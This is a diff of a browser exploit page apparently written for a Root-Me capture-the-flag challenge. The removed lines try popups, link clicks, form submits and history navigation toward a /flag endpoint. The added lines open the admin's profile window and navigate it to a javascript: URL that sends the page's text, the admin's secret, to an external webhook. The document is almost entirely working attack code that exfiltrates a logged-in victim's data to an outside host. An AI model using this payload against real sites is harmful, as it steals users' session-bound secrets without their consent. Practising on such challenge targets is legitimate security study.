@@ -1,39 +1,14 @@
-<!doctype html>
-<html>
-<body style="font-family: monospace">
-<div id="log">start</div>
 <script>
-const T = "http://challenge01.root-me.org:58007/flag";
-const L = (m) => document.getElementById("log").innerHTML += "<br>"+m;
+  // 1. Open the admin's profile page. 
+  // It will load the admin's secret because the admin is logged in.
+  const adminWin = window.open('http://challenge01.root-me.org:58003/profile', 'victim');
 
-// 1) Check popup capability
-let w = null;
-try { w = window.open("about:blank", "_blank"); } catch(e) {}
-L("popup=" + (w ? "opened" : "blocked"));
-
-if (w) {
-  try { w.location = T; L("popup->/flag"); } catch(e) { L("popup nav err"); }
-}
-
-// 2) Alternate new-context attempts
-try {
-  const a = document.createElement("a");
-  a.href = T; a.target = "_blank"; a.rel = "noopener noreferrer";
-  document.body.appendChild(a); a.click(); L("anchor click");
-} catch(e) { L("anchor err"); }
-
-try {
-  const f = document.createElement("form");
-  f.method = "GET"; f.action = T; f.target = "_blank";
-  document.body.appendChild(f); f.submit(); L("form submit");
-} catch(e) { L("form err"); }
-
-// 3) Main-tab history churn
-setTimeout(() => { location.href = T; }, 400);
-setTimeout(() => { location.href = "http://challenge01.root-me.org:58007/"; }, 900);
-setTimeout(() => { history.back(); }, 1400);
-setTimeout(() => { history.forward(); }, 1800);
-setTimeout(() => { history.back(); }, 2200);
+  // 2. We wait for the page to load.
+  setTimeout(() => {
+    // 3. Since we can't READ the admin's window cross-origin, 
+    // we use the 'location' property (which IS accessible) 
+    // to navigate the admin's window to a javascript URL.
+    // This executes the code INSIDE the admin's session.
+    adminWin.location.href = "javascript:fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?secret=' + document.body.innerText)";
+  }, 2000);
 </script>
-</body>
-</html>
